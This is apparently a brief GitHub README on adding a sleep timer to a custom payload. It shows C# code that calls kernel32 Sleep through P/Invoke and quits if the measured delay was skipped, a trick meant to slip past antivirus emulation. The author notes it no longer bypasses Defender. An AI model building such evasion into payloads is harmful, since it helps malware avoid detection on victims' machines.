Adding sleeptimer for payload
Continue from https://github.com/VietTheBarbarian/Encrypting-Custom-Payload

If heuristics encounters a pause or sleep instruction, it will
"fast forward" through the delay to the execution point 

Involve using pinvoke sleep function
```
[DllImport("kernel32.dll")]
   static extern void Sleep(uint dwMilliseconds);
```

Setting our app to sleep for 2000 ms


```
DateTime t1 = DateTime.Now;
Sleep(2000);
double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
if (t2 < 1.5)
{
    return;
}
```

Outdated wont bypass defender anymore
![image](https://github.com/user-attachments/assets/498dc1dd-1341-4673-9d4b-c711b3f3d3e9)
